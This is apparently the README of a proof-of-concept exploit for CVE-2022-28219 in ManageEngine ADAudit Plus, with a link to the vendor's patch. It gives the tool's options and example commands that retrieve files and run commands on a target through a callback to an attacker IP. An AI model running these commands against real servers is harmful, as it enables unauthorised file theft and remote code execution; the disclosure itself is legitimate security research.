# CVE-2022-28219
POC for CVE-2022-28219 affecting ManageEngine ADAudit Plus builds < 7060

## Technical Analysis
More details on our blog:
https://www.horizon3.ai/red-team-blog-cve-2022-28219

## Usage

```
% python3 CVE-2022-28219.py -h
usage: CVE-2022-28219.py [-h] -t TARGET -l LHOST -d DOMAIN [-lhp HTTP_PORT] [-lfp FTP_PORT] [-f FILE] [-c COMMAND] [-u USER]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target URL with port
  -l LHOST, --lhost LHOST
                        local bind IP
  -d DOMAIN, --domain DOMAIN
                        fully qualified domain served by ADAudit Plus
  -lhp HTTP_PORT, --http-port HTTP_PORT
                        local HTTP port to bind to
  -lfp FTP_PORT, --ftp-port FTP_PORT
                        local FTP port to bind to
  -f FILE, --file FILE  get file or directory listing at given path, use forward slashes and don't include drive, e.g. /windows/win.ini or /users
  -c COMMAND, --command COMMAND
                        command to execute, e.g. calc.exe
  -u USER, --user USER  user running ADAudit Plus app, useful for finding upload file quickly
```

For instance, to grab the `c:\windows\win.ini` file:

`python3 CVE-2022-28219.py -t <target_url> -l <attacker_ip> -d <target_fqdn> -f /windows/win.ini`

Or to run `calc.exe` on the target:

`python3 CVE-2022-28219.py -t <target_url> -l <attacker_ip> -d <target_fqdn> -c calc.exe`

Note file retrieval and RCE requires ManageEngine ADAudit Plus to be running on Java runtime 8u121 or below. This will be true most of the time as the default Java runtime version bundled with ADAudit Plus is 8u051.

## Mitigation

Update to [ManageEngine ADAudit Plus build 7060 or later](https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html).

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.